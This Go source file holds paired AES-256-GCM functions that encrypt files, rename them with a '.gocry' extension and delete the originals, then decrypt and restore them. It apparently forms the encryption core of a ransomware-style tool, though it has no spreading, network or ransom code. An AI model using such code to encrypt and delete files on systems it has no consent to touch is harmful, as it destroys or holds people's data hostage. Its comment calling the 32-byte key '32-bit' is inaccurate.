package crypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/ioutil"
	"os"
	"sync"
)

// aesgcmEncrypt takes in a file path and a 32-bit random key and uses AES-GCM-256 encryption
// to encrypt the file. It also adds the .gocry extension to the files.
func aesgcmEncrypt(wg *sync.WaitGroup, path string, key []byte) error {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		wg.Done()
		return err
	}

	block, _ := aes.NewCipher(key)
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		wg.Done()
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		wg.Done()
		return err
	}

	if err := ioutil.WriteFile(path+".gocry", gcm.Seal(nonce, nonce, data, nil), 0666); err != nil {
		wg.Done()
		return err
	}

	if err := os.Remove(path); err != nil {
		wg.Done()
		return err
	}

	wg.Done()

	return nil
}

// aesgcmDecrypt takes in a file path and a 32-bit encryption key and undoes the encryption.
// Also removes the .gocry extension from files.
func aesgcmDecrypt(wg *sync.WaitGroup, path string, key []byte) error {
	data, _ := ioutil.ReadFile(path)

	block, err := aes.NewCipher(key)
	if err != nil {
		wg.Done()
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		wg.Done()
		return err
	}

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		wg.Done()
		return err
	}

	// path[:len(path)-6] removes the .gocry extension from the filename -> test.png.gocry -> test.png
	if err := ioutil.WriteFile(path[:len(path)-6], plaintext, 0666); err != nil {
		wg.Done()
		return err
	}

	if err := os.Remove(path); err != nil {
		wg.Done()
		return err
	}

	wg.Done()

	return nil
}
